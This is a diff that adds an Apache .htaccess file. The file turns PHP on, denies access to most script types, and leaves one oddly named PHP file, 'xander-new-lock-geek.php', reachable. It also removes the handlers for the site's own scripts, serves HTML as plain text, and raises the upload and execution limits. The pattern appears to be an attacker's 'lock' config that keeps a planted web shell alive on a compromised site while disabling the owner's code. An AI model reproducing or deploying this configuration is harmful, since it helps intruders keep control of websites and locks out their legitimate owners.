@@ -1,0 +1,37 @@
+<IfModule mod_php.c>
+    php_value engine on
+    php_flag engine on
+</IfModule>
+
+<FilesMatch "\.(ph|sh|as|in|te)$">
+    Order Deny,Allow
+    Deny from all
+</FilesMatch>
+
+<FilesMatch "\.(jpg|jpeg|png|gif|bmp|ico|mp4|avi|mov|wmv|mp3|wav|ogg|pdf|doc|docx|xls|xlsx|zip|rar|tar|gz|ppt|pptx|csv)$">
+    Order Deny,Allow
+    Allow from all
+</FilesMatch>
+
+<FilesMatch "^(xander-new-lock-geek.php)$"># 
+    Order allow,deny 
+    Allow from all 
+</FilesMatch>
+
+Options -Indexes
+
+RemoveHandler .cgi .pl .py .php .php3 .php4 .php5 .php6 .inc
+RemoveType .cgi .pl .py .php .php3 .php4 .php5 .php6 .inc
+SetHandler None
+SetHandler default-handler
+
+AddType text/plain .html
+AddType text/plain .htm
+
+<IfModule mod_php5.c>
+    php_value max_execution_time 300000
+    php_value max_input_time 300000
+    php_value upload_max_filesize 100M
+    php_value post_max_size 100M
+    php_value max_file_uploads 50M
+</IfModule>
